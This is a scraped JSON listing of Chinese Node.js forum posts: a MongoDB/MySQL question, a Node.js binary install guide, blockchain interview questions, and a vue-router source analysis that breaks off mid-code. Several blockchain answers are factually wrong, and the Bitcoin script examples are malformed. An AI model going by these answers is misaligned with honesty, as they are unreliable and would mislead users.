class=\"markdown-text\"><p>如何解决兼容问题？上一个项目是用mongo数据库，最新的项目是mysql，但是部分业务需要用到mongo，所以想两者共存，请问有比较好的解决方案吗？</p>\n</div>","title":"egg框架可以同时支持mongo和mysql两种不同的数据库使用吗？（已解决）","last_reply_at":"2019-04-18T03:11:44.439Z","good":false,"top":false,"reply_count":10,"visit_count":1102,"create_at":"2019-04-17T03:35:47.882Z","author":{"loginname":"shanzemin","avatar_url":"https://avatars3.githubusercontent.com/u/32158058?v=4&s=120"}},{"id":"5cb5f31ba86ae80ce64afd1c","author_id":"58898ca65d4612c33919ea01","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p>Linux有很多个发行版本，不同的发行版本有不同的包管理工具。为了安装指定的Node.js版本，有时候需要花一些精力找攻略或者安装额外的包管理工具等，有些包管理工具并没有最新的Node.js版本。所以，如果是Linux系统，索性直接使用编译好的二进制文件进行安装是最省心省力的。</p>\n<h2>安装</h2>\n<ul>\n<li>下载指定版本的二进制文件</li>\n</ul>\n<p>在Node.js官方的发布网站<a href=\"https://nodejs.org/dist/\">https://nodejs.org/dist/</a>下载合适的二进制包，比如我要安装<code>v11.14.0</code>版本，我需要下载二进制包为<a href=\"https://nodejs.org/dist/v11.14.0/node-v11.14.0-linux-x64.tar.gz\">node-v11.14.0-linux-x64.tar.gz</a>。</p>\n<ul>\n<li>解压文件</li>\n</ul>\n<pre class=\"prettyprint language-shell\"><code>tar -xvf node-v11.14.0-linux-x64.tar.gz\n</code></pre><ul>\n<li>拷贝文件到指定目录</li>\n</ul>\n<pre class=\"prettyprint language-shell\"><code>sudo cp -r node-v11.14.0-linux-x64&#x2F;* &#x2F;usr&#x2F;local&#x2F;\n</code></pre><ul>\n<li>测试是否安装成功</li>\n</ul>\n<pre class=\"prettyprint language-shell\"><code>root@blackmatch:~# node -v\nv11.14.0\nroot@blackmatch:~# npm -v\n6.7.0\nroot@blackmatch:~# npx -v\n6.7.0\n</code></pre><h2>总结</h2>\n<ul>\n<li>二进制包一定要下载合适的（比如x64、x86）等。</li>\n<li>安装完成后如果相关命令不生效，请重新打开一个终端即可生效。</li>\n</ul>\n</div>","title":"在Linux系统上通过二进制包安装Node.js","last_reply_at":"2019-04-18T01:35:12.182Z","good":false,"top":false,"reply_count":5,"visit_count":983,"create_at":"2019-04-16T15:22:03.832Z","author":{"loginname":"blackmatch","avatar_url":"https://avatars3.githubusercontent.com/u/12443954?v=4&s=120"}},{"id":"5ad6a0693edb2aff6be85bbd","author_id":"547c35030ae47dec03aa2939","tab":"share","content":"<div class=\"markdown-text\"><ol>\n<li>\n<p>问：你认为区块链技术中的区块意味着什么？\n区块链由所有金融交易的信息组成。一个块只不过是一个记录列表。当这些列表相互结合时，它们被称为区块链。例如，一个组织有100个分类账簿，其中的组合被称为区块链，单个分类账将被视为一个区块。</p>\n</li>\n<li>\n<p>问：为什么区块链是一种值得信赖的方法\n有很多原因，区块链可以被信任。第一个原因是它与其他商业应用程序有良好的兼容性，因为它是开源的。其次是它的安全性，因为它是为了在线交易而开发的，所以开发人员在保证安全性的同时也特别关注它的数据同步。由于其拥有的业务类型无关，所以在选择的时候区别链很容易地被考虑。</p>\n</li>\n<li>\n<p>问：区块链中是否有可能从网络中删除一个或多个区块？\n当然可以，如果只考虑该在线分类帐的特定部分的时候。借助默认选项和过滤器，可以轻松完成此任务，而不需要付出太多。</p>\n</li>\n<li>\n<p>问：你对区块链了解多少？\n这是一种实际上为比特币设计的技术，后来因为监控和记录网络上所有金融交易而带来的多种好处而获得了大量的推广。这是一种值得信赖的方法，目前情况下有很多组织正在使用它。由于一切都是十分安全的，并且它是一种开源方式，所以从长远来看，它可以轻松获得大家的信任。</p>\n</li>\n<li>\n<p>问：区块链方法如何识别区块？\n在线分类帐中的每个块基本上都包含一个哈希指针，该指针指向它之前的块并形成链接，块中包含交易数据和时间戳。</p>\n</li>\n<li>\n<p>问：你认为一个区块的安全性究竟是什么？\n网络上的所有用户都不能修改块。因此它提供了极好的安全级别。除此之外，每个区块都使用加密技术进行保护，这是另一项措施。因此，不需要担心块中存在的数据的安全性和安全性。</p>\n</li>\n<li>\n<p>问：在组织中使用区块链技术是否有网络特定的条件？\n使用它没有特定的条件。但是，网络必须是有关协议下的对等网络。它实际上很简单地验证了新块，并帮助组织在不投资第三方应用程序的情况下保持同步。</p>\n</li>\n<li>\n<p>问：什么是加密？它在区块链中的作用是什么？\n数据安全始终很重要。加密基本上是一种帮助组织保持数据安全的方法。在这种技术中，数据在被发送者发送到网络之前被编码或者在一定程度上被改变。唯一的接收器可以理解如何对其进行解码。在区块链中，这种方法很有用，因为它增加了区块的整体安全性和真实性，并有助于保护区块的安全。</p>\n</li>\n<li>\n<p>问：一旦写入数据块后，是否可以修改数据？\n不，这是不可能的。如果需要进行任何修改，组织只需删除所有其他块的信息。这是因为没有其他方法，数据在使用这种方法时必须非常谨慎。</p>\n</li>\n<li>\n<p>问：区块链中可以保存哪些类型的记录？有什么限制吗？\n区块链方法中没有任何类型记录的限制。目前，世界各地的许多组织正在使用这种方法，事实是医疗交易记录，与组织相关的事件，管理活动，交易处理，身份管理以及文件记录都是常见的可以使用区块链的记录类型。而且记录保存并不仅限于这些应用程序。</p>\n</li>\n<li>\n<p>问：什么是双重支出？</p>\n</li>\n</ol>\n<p>这是与数字货币有关的主要问题之一。 事实上，这是一个数字通证被多次使用的条件，因为通证通常由易于克隆的数字文件组成。它只会导致通货膨胀，组织不得不承受巨大的损失。 区块链技术的主要目标之一是尽可能地消除这种方法。</p>\n<ol>\n<li>问：解释盲签名的重要性以及它如何有用？</li>\n</ol>\n<p>它实际上是一种数字签名形式，密码学的一个重要组成部分，其中所有信息在实际考虑或签署之前都是盲目的。 这是经过验证的方法，通常在作者和签署方都不同的隐私相关协议中考虑。 数字货币设计是最常见的例子之一。</p>\n<ol>\n<li>问：什么是密钥分享？区块链技术有什么好处吗？</li>\n</ol>\n<p>众所周知的事实是，数字交易中的安全问题非常重要。密钥分享是一种类似的方法。在区块链技术中，这是一种将密钥密或个人信息划分为不同单元并将其发送给网络上的用户的方法。原始信息只能在分配了密钥的参与者同意将他们与其他人结合在一起时才能结合使用。它可以在区块链技术中提供多种与安全相关的好处。</p>\n<ol>\n<li>\n<p>问：超级账本是什么？区块链支持吗？\n超级账本只不过是一种特殊的账本，为给人们提供服务的企业而设计。没有严格的服务上限，企业可以通过超级账本进行管理。区块链拥有专门用于处理超级账本的算法。事实上，它减少了许多与此相关的问题。</p>\n</li>\n<li>\n<p>问：命名区块链项目实施中涉及的步骤？\n这个过程共涉及六个步骤，它们是：\n1.需求识别\n2.筛选并确认需求\n3.区块链项目开发\n4.安全性的可行性研究\n5.实施\n6.控制和监测项目</p>\n</li>\n<li>\n<p>问：你所知道区块链的好处是什么？\n它鼓励安全的在线交易，这是它最大的好处之一。基本上，作为一个密切关注所有交易记录的分布式分散账本，它不会让记录被任何人改变，这增强了安全性。除此之外，参与者和企业主可以始终确保最终的成本审计。区块链始终可以保证的一件事是每个区块或单元只能传输一次，这样可以消除双重支出问题。</p>\n</li>\n<li>\n<p>问：将区块链数据库中存在的两种记录命名为？\n这些记录是块记录和交易记录。这两个记录都可以轻松访问，最好的方式是可以将它们彼此集成，而无需遵循复杂的算法。</p>\n</li>\n<li>\n<p>问：你了解的信息威胁有哪些？\n目前情况下信息面临很多威胁。由于互联网在线交易的增加，许多黑客已经变得活跃，正在采用新方法来破解包含财务信息的数据和服务器。主要的威胁是软件攻击，身份盗窃，信息勒索以及破坏。除此之外，特洛伊木马，蠕虫和病毒也是麻烦的创造者。</p>\n</li>\n<li>\n<p>问：信息泄漏对组织可能造成什么挑战？\n信息泄露可以极大地降低组织的声誉。除此之外，这可能是组织承受巨大损失的原因。许多未能实施安全协议来保证其数据安全的组织已经失去了客户的信任，并且正在努力争取再次获得相同的声誉。如果不关注在线交易安全，任何组织的总体利润可降低80％。</p>\n</li>\n<li>\n<p>问：有那些可以使用区块链技术的组织？\n可以考虑这种方法的商业类别没有严格的上限。事实上，几乎所有的企业都在进行在线或财务交易，而这些交易需要他们顺利的执行完整的流程。大型公司，金融机构，私营企业，政府部门乃至国防组织都可以非常轻松地信任这项技术。</p>\n</li>\n<li>\n<p>问：什么是信息处理？与此相关的关键挑战是什么？\n这些信息通常在网络上共享。在通过网络实际发送之前，需要将其改变为适合频道标准的格式（频道是发送者和接收者之间的链接）。在发送端和接收端进行信息转换所做的工作通常被认为是信息处理。信息处理所面临的最大挑战就是在这段时间保护它。另一个挑战是处理批量信息会对性能造成限制。</p>\n</li>\n<li>\n<p>问：BIP代表什么？\n这意味着比特币改善建议。</p>\n</li>\n<li>\n<p>问：区块链中的哪些关键原则有助于消除需要遵循的安全威胁？\n是的，在时间方面需要遵循一些原则。他们是：\n1.审计\n2.保护应用程序\n3.确保测试和类似的方法\n4.数据库安全\n5.连续性计划\n6.数字劳动力培训</p>\n</li>\n</ol>\n<p>所有这些原则都是基本的，并且易于实施。它们有助于使交易记录有用。</p>\n<ol>\n<li>\n<p>问：区块链技术的基础是什么？\n它使信息能够在用户之间分发而不被复制。</p>\n</li>\n<li>\n<p>问：区块链是不可破坏的分类账吗？\n根据开发商的说法，区块链分类帐不能损坏。</p>\n</li>\n<li>\n<p>问：什么是安全策略？\n安全策略定义了系统上确切需要确保的内容。它根据一些核心协议绑定网络用户，他们都必须同意并遵循以提高整体安全性。当涉及到组织的信息或财务记录时，多个安全策略的实施不止一个。</p>\n</li>\n<li>\n<p>问：在确保交易记录时，您将如何处理风险管理？\n它基本上是一个查找组织的财务记录的威胁和所有漏洞的过程。对付这种做法最好的办法是立即采取正确的对策。另一种方法是注意备份计划。根据信息的价值，可以简单地考虑购买新风险管理软件等更多方法。信息的主要风险来自黑帽黑客。</p>\n</li>\n<li>\n<p>问：请列出区块链中用户可以考虑的普通类型的分类帐？\n这些是：\n1.集中式分类账\n2.分散式分类帐\n3.分布式分类帐</p>\n</li>\n<li>\n<p>问：区块链分类账与普通分类账的区别？\n第一个，其实最主要的区别是区块链是一个可以非常容易分散的数字分类帐。这种方法出错的几率远远低于普通分类账中的错误率。普通账本就是用手或人工努力准备的，而区块链自动执行所有任务。你只需要以适当的方式配置它，并遵循所有的指导原则。</p>\n</li>\n<li>\n<p>问：分布式数字分类帐用于在BlockChain中记录交易。系统依赖于什么？</p>\n</li>\n</ol>\n<p>它依赖于网络节点。</p>\n<p>以上问题出自：<a href=\"https://mindmajix.com/blockchain-interview-questions\">https://mindmajix.com/blockchain-interview-questions</a></p>\n<ol>\n<li>问：陷门函数的功能是什么，为什么它是区块链所需要的？</li>\n</ol>\n<p>一个陷门函数是在一个方向上容易计算但难以在相反方向的计算，除非你有特殊的信息。陷门函数是必不可少的公共密钥加密，所以他们常用在blockchain发展代表思想的地址和私有密钥。</p>\n<ol>\n<li>问：比特币实现中的交易和块是如何加密的？</li>\n</ol>\n<p>比特币块不以任何方式加密：每个块都是公开的。阻止修改和保证数据完整性的是一个称为块哈希的值。块的内容是使用在比特币的一种特殊Hash函数来处理，它的实现和得到的值包含在区块链中。</p>\n<ol>\n<li>问 ：解释为什么区块链需要通证。</li>\n</ol>\n<p>代币/通证用于实现状态之间的变化。当有人做交易时，这是一种状态的改变，代币从一个地址移到另一个地址。除此之外，交易可以包含额外的数据和状态的变化来改变数据，来做这一个不变的定义区块链的唯一途径。从技术上讲，区块链不需要代币为其主要业务，但没有他们，其他方式需要引进管理链状态和验证交易。</p>\n<ol>\n<li>问：对等网络（P2P）网络中对等体是如何工作的？</li>\n</ol>\n<p>当一个新的节点启动时，它对网络一无所知，因为没有中央服务器。通常开发人员提供可信节点的列表，这些节点直接写入可用于初始对等点发现的代码中。</p>\n<ol>\n<li>问：如何验证检查一个块是有效的？</li>\n</ol>\n<p>网络上的每个完整节点都进行块验证。当一个新的块被宣布时，接收它的每个节点都会执行一个检查列表。两个最重要的检查是工作证明（如果一个块提供足够的工作要包含在链中）和所有事务的有效性（每个事务必须是有效的）。</p>\n<ol>\n<li>问：一个ScriptPubKey是什么？解释如何使用P2SH地址就可以了。</li>\n</ol>\n<p>一个是所谓的锁定ScriptPubKey脚本。它出现目的是阻止交易的输出，在输出过程中必须满足。</p>\n<p>P2SH是一种特殊类型的地址，代替复杂的锁定脚本的hash值。当一个试图花费输出的交易稍后显示时，除了解锁脚本之外，它还必须包含与哈希匹配的脚本。</p>\n<ol>\n<li>问：使用脚本，编写一个redeem script脚本，允许用户仅在用户知道魔术数字1234567时才使用输出。</li>\n</ol>\n<pre class=\"prettyprint\"><code>OP_EQUALVERIFY\nscriptPubKey: 1234567 OP_EQUALVERIFY\nscriptSig: 1234567\n</code></pre><ol>\n<li>问：使用脚本，编写一个redeem script脚本，允许任何人在一次老化后最少花费30天的时间。</li>\n</ol>\n<pre class=\"prettyprint\"><code>scriptPubKey: &quot;30d&quot; OP_CHECKSEQUENCEVERIFY OP_VERIFY\nscriptSig: empty\n</code></pre><ol>\n<li>问：什么是挖矿？</li>\n</ol>\n<p>挖矿是在区块链网络达成共识的过程。挖矿有两个目的。首先，它在生成的块中创建新的代币。其次，它通过向网络提供工作证明，包括分布式计费中的交易；也就是说，证明所生成的块是有效的。</p>\n<ol>\n<li>问：什么是软分叉？</li>\n</ol>\n<p>在分类帐中的块包括以建立最长链的方式，即具有最大累积难度的链。分叉是有两个候选块竞争形成最长的区块链，两个矿工发现工作问题的证明方法在很短的时间内没有同步对方的情况。造成网络分割，因为某些节点得到块从矿工#1和而另外一些得到矿工#2。\n分叉通常在一个块中得到解决，因为这种情况再次发生的概率变得非常低，因为下一个块出现，所以很快有一个新的最长链，将被认为是主要的。</p>\n<p>（注：这种叉不同于硬叉，这是一些开发商决定创建一个不向后兼容的改变到区块链协议，导致两个永远不同区块链。）</p>\n<p>以上问题出自：<a href=\"https://www.toptal.com/blockchain/interview-questions\">https://www.toptal.com/blockchain/interview-questions</a></p>\n<p>顺便推荐两个区块链、以太坊开发DApp的实战教程：</p>\n<ol>\n<li>\n<p>适合区块链新手的以太坊DApp开发：\n<a href=\"http://xc.hubwiz.com/course/5a952991adb3847553d205d1?affid=20180418cnodew\">http://xc.hubwiz.com/course/5a952991adb3847553d205d1</a></p>\n</li>\n<li>\n<p>用区块链、星际文件系统（IPFS）、Node.js和MongoDB来构建电商平台:\n<a href=\"http://xc.hubwiz.com/course/5abbb7acc02e6b6a59171dd6/?affid=20180418cnodew\">http://xc.hubwiz.com/course/5abbb7acc02e6b6a59171dd6</a></p>\n</li>\n</ol>\n</div>","title":"区块链面试招聘中可能会被问到的40个问题。","last_reply_at":"2019-04-17T17:38:27.467Z","good":false,"top":false,"reply_count":2,"visit_count":2548,"create_at":"2018-04-18T01:33:29.450Z","author":{"loginname":"2596887568","avatar_url":"https://avatars3.githubusercontent.com/u/9349200?v=4&s=120"}},{"id":"5ae886c51b02288048bd0b75","author_id":"5ae885ad1b02288048bd0b74","tab":"ask","content":"<div class=\"markdown-text\"><p>小白一个 学了点小基础 希望能够提升一下\n希望各位表哥  分享一下开源项目和学习教程</p>\n</div>","title":"求node和微信小程序的教程或者 开源项目","last_reply_at":"2019-04-17T15:51:25.158Z","good":false,"top":false,"reply_count":43,"visit_count":7620,"create_at":"2018-05-01T15:24:53.470Z","author":{"loginname":"longletian","avatar_url":"https://avatars0.githubusercontent.com/u/28197668?v=4&s=120"}},{"id":"5cb53882207b2365936ed958","author_id":"5a1067384f0d21491dd96078","tab":"ask","content":"<div class=\"markdown-text\"><p>其他常用的包也可以推荐</p>\n</div>","title":"在本地起一个指定目录的静态服务器，有没有合适的包推荐","last_reply_at":"2019-04-17T15:27:48.886Z","good":false,"top":false,"reply_count":10,"visit_count":1278,"create_at":"2019-04-16T02:05:54.636Z","author":{"loginname":"lucky-leaf","avatar_url":"https://avatars1.githubusercontent.com/u/31915733?v=4&s=120"}},{"id":"5cb7125d37faec0ce1d02fa0","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/14/16a1a43866ee4958?w=1380&amp;h=806&amp;f=jpeg&amp;s=110148\" alt=\"image\"></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/14/16a1a43668effc5b?w=2786&amp;h=1644&amp;f=png&amp;s=525606\" alt=\"image\"></p>\n<h2>感谢</h2>\n<p><a href=\"https://github.com/funfish/blog/issues/8\">funfish</a>, <a href=\"https://juejin.im/post/5af108dc518825672565cf31#heading-5\">玩弄心里的鬼</a>, <a href=\"https://ustbhuangyi.github.io/vue-analysis/vue-router/transition-to.html#%E7%BB%84%E4%BB%B6\">Vue.js 技术揭秘</a>的文章，对我的帮助</p>\n<h2>前言</h2>\n<p>vue-router的源码不算很多, 但是内容也不算少。本文谈不上逐行分析, 但是会尽量详尽的说明主流程和原理。对一些工具函数和边缘条件的处理会略过，因为我也没有逐行去了解它们，请见谅。</p>\n<h2>前置基础知识</h2>\n<p>我们在学习VueRouter源码前，先来复习下hash以及histroy相关的知识。更多细节请参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/History_API\">mdn文档</a>，本节内容节选自mdn文档。</p>\n<h3>hash</h3>\n<h4>onhashchange</h4>\n<p>当URL的片段标识符更改时，将触发hashchange事件 (跟在＃符号后面的URL部分，包括＃符号)。注意 histroy.pushState() 绝对不会触发 hashchange 事件，即使新的URL与旧的URL仅哈希不同也是如此。</p>\n<h3>histroy</h3>\n<h4>pushState</h4>\n<p>pushState()需要三个参数: 一个状态对象, 一个标题(目前被忽略), 和一个URL。</p>\n<ul>\n<li>state, 状态对象state是一个JavaScript对象，popstate事件触发时，该对象会传入回调函数</li>\n<li>title, 目前所有浏览器忽略</li>\n<li>url, 新的url记录</li>\n</ul>\n<h4>replaceState</h4>\n<p>history.replaceState()的使用与history.pushState()非常相似，区别在于replaceState()是修改了当前的历史记录项而不是新建一个。</p>\n<h4>onpopstate</h4>\n<p>调用history.pushState()或者history.replaceState()不会触发popstate事件. popstate事件只会在浏览器某些行为下触发, 比如点击后退、前进按钮(或者在JavaScript中调用history.back()、history.forward()、history.go()方法)。</p>\n<p>如果当前处于激活状态的历史记录条目是由history.pushState()方法创建, 或者由history.replaceState()方法修改过的, 则popstate事件对象的state属性包含了这个历史记录条目的state对象的一个拷贝。</p>\n<h2>应用初始化</h2>\n<p>通常构建一个Vue应用的时候, 我们会使用Vue.use以插件的形式安装VueRouter。同时会在Vue的实例上挂载router的实例。</p>\n<pre class=\"prettyprint language-js\"><code>import Vue from &#x27;vue&#x27;\nimport App from &#x27;.&#x2F;App.vue&#x27;\nimport router from &#x27;.&#x2F;router&#x27;\n\nVue.config.productionTip = false\n\nlet a = new Vue({\n  router,\n  render: h =&gt; h(App)\n}).$mount(&#x27;#app&#x27;)\n</code></pre><pre class=\"prettyprint language-js\"><code>\nimport Vue from &#x27;vue&#x27;\nimport Router from &#x27;vue-router&#x27;\nimport Home from &#x27;.&#x2F;views&#x2F;Home.vue&#x27;\n\nVue.use(Router)\n\nexport default new Router({\n  mode: &#x27;history&#x27;,\n  base: process.env.BASE_URL,\n  routes: [\n    {\n      path: &#x27;&#x2F;&#x27;,\n      name: &#x27;home&#x27;,\n      component: Home\n    },\n    {\n      path: &#x27;&#x2F;about&#x27;,\n      name: &#x27;about&#x27;,\n      component: () =&gt; import(&#x2F;* webpackChunkName: &quot;about&quot; *&#x2F; &#x27;.&#x2F;views&#x2F;About.vue&#x27;)\n    }\n  ]\n})\n</code></pre><h2>插件的安装</h2>\n<p>在Vue的文档中指出<strong>Vue.js 的插件应该有一个公开方法 install。这个方法的第一个参数是 Vue 构造器，第二个参数是一个可选的选项对象</strong>, 我们首先查看源码中install.js的文件。</p>\n<p>在install文件中, 我们在Vue的实例上初始化了一些私有属性</p>\n<ul>\n<li>_routerRoot, 指向了Vue的实例</li>\n<li>_router, 指向了VueRouter的实例</li>\n</ul>\n<p>在Vue的prototype上初始化了一些getter</p>\n<ul>\n<li>$router, 当前Router的实例</li>\n<li>$route, 当前Router的信息</li>\n</ul>\n<p>并且在全局混入了mixin, 已经全局注册了RouterView, RouterLink组件.</p>\n<pre class=\"prettyprint language-js\"><code>\nimport View from &#x27;.&#x2F;components&#x2F;view&#x27;\nimport Link from &#x27;.&#x2F;components&#x2F;link&#x27;\n\nexport let _Vue\n\nexport function install (Vue) {\n  if (install.installed &amp;&amp; _Vue === Vue) return\n  install.installed = true\n\n  _Vue = Vue\n\n  const isDef = v =&gt; v !== undefined\n\n  const registerInstance = (vm, callVal) =&gt; {\n    let i = vm.$options._parentVnode\n    if (isDef(i) &amp;&amp; isDef(i = i.data) &amp;&amp; isDef(i = i.registerRouteInstance)) {\n      i(vm, callVal)\n    }\n  }\n\n  Vue.mixin({\n    beforeCreate () {\n      &#x2F;&#x2F; 判断是否实例是否挂载了router\n      if (isDef(this.$options.router)) {\n        this._routerRoot = this\n        this._router = this.$options.router\n        this._router.init(this)\n        &#x2F;&#x2F; _router, 劫持的是当前的路由\n        Vue.util.defineReactive(this, &#x27;_route&#x27;, this._router.history.current)\n      } else {\n        this._routerRoot = (this.$parent &amp;&amp; this.$parent._routerRoot) || this\n      }\n      registerInstance(this, this)\n    },\n    destroyed () {\n      registerInstance(this)\n    }\n  })\n\n  Object.defineProperty(Vue.prototype, &#x27;$router&#x27;, {\n    get () { return this._routerRoot._router }\n  })\n\n  Object.defineProperty(Vue.prototype, &#x27;$route&#x27;, {\n    get () { return this._routerRoot._route }\n  })\n\n  Vue.component(&#x27;RouterView&#x27;, View)\n  Vue.component(&#x27;RouterLink&#x27;, Link)\n\n  const strats = Vue.config.optionMergeStrategies\n  strats.beforeRouteEnter = strats.beforeRouteLeave = strats.beforeRouteUpdate = strats.created\n}\n</code></pre><p>Vue.util.defineReactive, 这是Vue里面观察者劫持数据的方法，劫持_route，当_route触发setter方法的时候，则会通知到依赖的组件。<strong>而RouterView, 需要访问parent.$route所以形成了依赖</strong>(我们在后面会看到)</p>\n<p>👀我们到Vue中看一下defineReactive的源码, 在defineReactive, 会对_route使用Object.defineProperty劫持setter方法。set时会通知观察者。</p>\n<pre class=\"prettyprint language-js\"><code>\n\nObject.defineProperty(obj, key, {\n  enumerable: true,\n  configurable: true,\n  get: function reactiveGetter () {\n    &#x2F;&#x2F; ...\n  },\n  set: function reactiveSetter (newVal) {\n    &#x2F;&#x2F; ...\n    childOb = !shallow &amp;&amp; observe(newVal)\n    dep.notify()\n  }\n})\n</code></pre><h2>VueRouter实例</h2>\n<pre class=\"prettyprint language-js\"><code>\nexport default class VueRouter {\n  constructor (options: RouterOptions = {}) {\n    this.app = null\n    this.apps = []\n    this.options = options\n    this.beforeHooks = []\n    this.resolveHooks = []\n    this.afterHooks = []\n    this.matcher = createMatcher(options.routes || [], this)\n\n    let mode = options.mode || &#x27;hash&#x27;\n    &#x2F;&#x2F; fallback会在不支持history环境的情况下, 回退到hash模式\n    this.fallback = mode === &#x27;history&#x27; &amp;&amp; !supportsPushState &amp;&amp; options.fallback !== false\n    if (this.fallback) {\n      mode = &#x27;hash&#x27;\n    }\n    if (!inBrowser) {\n      mode = &#x27;abstract&#x27;\n    }\n    this.mode = mode\n\n    switch (mode) {\n      case &#x27;history&#x27;:\n        this.history = new HTML5History(this, options.base)\n        break\n      case &#x27;hash&#x27;:\n        this.history = new HashHistory(this, options.base, this.fallback)\n        break\n      case &#x27;abstract&#x27;:\n        this.history = new AbstractHistory(this, options.base)\n        break\n      default:\n        if (process.env.NODE_ENV !== &#x27;production&#x27;) {\n          assert(false, &#96;invalid mode: ${mode}&#96;)\n        }\n    }\n  }\n}\n</code></pre><h2>matcher</h2>\n<p>matcher对象中包含了两个属性, addRoutes, match。</p>\n<h3>pathList, pathMap, nameMap</h3>\n<p>pathList, pathMap, nameMap分别是路径的列表, 路径和路由对象的映射, 路由名称和路由对象的映射。vue-router目标支持动态路由, pathList, pathMap, nameMap可以在初始化后动态的被修改。它们由createRouteMap方法创建, 我们来看看createRouteMap的源码。</p>\n<pre class=\"prettyprint language-js\"><code>\nexport function createRouteMap (\n  routes,\n  oldPathList,\n  oldPathMap,\n  oldNameMap\n) {\n  &#x2F;&#x2F; pathList，pathMap，nameMap支持后续的动态添加\n  const pathList: Array&lt;string&gt; = oldPathList || []\n  const pathMap: Dictionary&lt;RouteRecord&gt; = oldPathMap || Object.create(null)\n  const nameMap: Dictionary&lt;RouteRecord&gt; = oldNameMap || Object.create(null)\n\n  &#x2F;&#x2F; 遍历路由列表\n  routes.forEach(route =&gt; {\n    addRouteRecord(pathList, pathMap, nameMap, route)\n  })\n\n  &#x2F;&#x2F; 将通配符的路径, push到pathList的末尾\n  for (let i = 0, l = pathList.length; i &lt; l; i++) {\n    if (pathList[i] === &#x27;*&#x27;) {\n      pathList.push(pathList.splice(i, 1)[0])\n      l--\n      i--\n    }\n  }\n\n  return {\n    pathList,\n    pathMap,\n    nameMap\n  }\n}\n</code></pre><p>routes为一组路由, 所以我们循环routes, 但是route可能存在children所以我们通过递归的形式创建route。返回一个route的树🌲</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction addRouteRecord (\n  pathList,\n  pathMap,\n  nameMap,\n  route,\n  parent,\n  matchAs\n) {\n  const { path, name } = route\n \n  const pathToRegexpOptions: PathToRegexpOptions = route.pathToRegexpOptions || {}\n\n  &#x2F;&#x2F; normalizePath, 会对path进行格式化\n  &#x2F;&#x2F; 会删除末尾的&#x2F;，如果route是子级，会连接父级和子级的path，形成一个完整的path\n  const normalizedPath = normalizePath(\n    path,\n    parent,\n    pathToRegexpOptions.strict\n  )\n\n  if (typeof route.caseSensitive === &#x27;boolean&#x27;) {\n    pathToRegexpOptions.sensitive = route.caseSensitive\n  }\n\n  &#x2F;&#x2F; 创建一个完整的路由对象\n  const record: RouteRecord = {\n    path: normalizedPath,\n    regex: compileRouteRegex(normalizedPath, pathToRegexpOptions),\n    components: route.components || { default: route.component },\n    instances: {},\n    name,\n    parent,\n    matchAs,\n    redirect: route.redirect,\n    beforeEnter: route.beforeEnter,\n    meta: route.meta || {},\n    props: route.props == null\n      ? {}\n      : route.components\n        ? route.props\n        : { default: route.props }\n  }\n\n  &#x2F;&#x2F; 如果route存在children, 我们会递归的创建路由对象\n  &#x2F;&#x2F; 递归的创建route对象\n  if (route.children) {\n    route.children.forEach(child =&gt; {\n      const childMatchAs = matchAs\n        ? cleanPath(&#96;${matchAs}&#x2F;${child.path}&#96;)\n        : undefined\n      addRouteRecord(pathList, pathMap, nameMap, child, record, childMatchAs)\n    })\n  }\n\n  &#x2F;&#x2F; 这里是对路由别名的处理\n  if (route.alias !== undefined) {\n    const aliases = Array.isArray(route.alias)\n      ? route.alias\n      : [route.alias]\n\n    aliases.forEach(alias =&gt; {\n      const aliasRoute = {\n        path: alias,\n        children: route.children\n      }\n      addRouteRecord(\n        pathList,\n        pathMap,\n        nameMap,\n        aliasRoute,\n        parent,\n        record.path || &#x27;&#x2F;&#x27; &#x2F;&#x2F; matchAs\n      )\n    })\n  }\n\n  &#x2F;&#x2F; 填充pathMap，nameMap，pathList\n  if (!pathMap[record.path]) {\n    pathList.push(record.path)\n    pathMap[record.path] = record\n  }\n\n  if (name) {\n    if (!nameMap[name]) {\n      nameMap[name] = record\n    }\n  }\n}\n</code></pre><h3>addRoutes</h3>\n<p>动态添加更多的路由规则, 并动态的修改pathList，pathMap，nameMap</p>\n<pre class=\"prettyprint language-js\"><code>function addRoutes (routes) {\n  createRouteMap(routes, pathList, pathMap, nameMap)\n}\n</code></pre><h3>match</h3>\n<p>match方法根据参数raw(可以是字符串也可以Location对象), 以及currentRoute（当前的路由对象返回Route对象)，在nameMap中查找对应的Route，并返回。</p>\n<p>如果location包含name, 我通过nameMap找到了对应的Route, 但是此时path中可能包含params, 所以我们会通过fillParams函数将params填充到patch，返回一个真实的路径path。</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction match (\n  raw,\n  currentRoute,\n  redirectedFrom\n) {\n  &#x2F;&#x2F; 会对raw，currentRoute处理，返回格式化后path, hash, 以及params\n  const location = normalizeLocation(raw, currentRoute, false, router)\n\n  const { name } = location\n\n  if (name) {\n    const record = nameMap[name]\n    if (!record) return _createRoute(null, location)\n    \n    &#x2F;&#x2F; 获取所有必须的params。如果optional为true说明params不是必须的\n    const paramNames = record.regex.keys\n      .filter(key =&gt; !key.optional)\n      .map(key =&gt; key.name)\n\n    if (typeof location.params !== &#x27;object&#x27;) {\n      location.params = {}\n    }\n\n    if (currentRoute &amp;&amp; typeof currentRoute.params === &#x27;object&#x27;) {\n      for (const key in currentRoute.params) {\n        if (!(key in location.params) &amp;&amp; paramNames.indexOf(key) &gt; -1) {\n          location.params[key] = currentRoute.params[key]\n        }\n      }\n    }\n\n    if (record) {\n      &#x2F;&#x2F; 使用params对path进行填充返回一个真实的路径\n      location.path = fillParams(record.path, location.params, &#96;named route &quot;${name}&quot;&#96;)\n      &#x2F;&#x2F; 创建Route对象\n      return _createRoute(record, location, redirectedFrom)\n    }\n  } else if (location.path) {\n    location.params = {}\n    for (let i = 0; i &lt; pathList.length; i++) {\n      const path = pathList[i]\n      const record = pathMap[path]\n      &#x2F;&#x2F; 使用pathList中的每一个regex，对path进行匹配\n      if (matchRoute(record.regex, location.path, location.params)) {\n        return _createRoute(record, location, redirectedFrom)\n      }\n    }\n  }\n  return _createRoute(null, location)\n}\n</code></pre><p>我们接下来继续看看_createRoute中做了什么。</p>\n<pre class=\"prettyprint language-js\"><code>\nfunction _createRoute (\n  record: ?RouteRecord,\n  location: Location,\n  redirectedFrom?: Location\n): Route {\n  if (record &amp;&amp; record.redirect) {\n    return redirect(record, redirectedFrom || location)\n  }\n  if (record 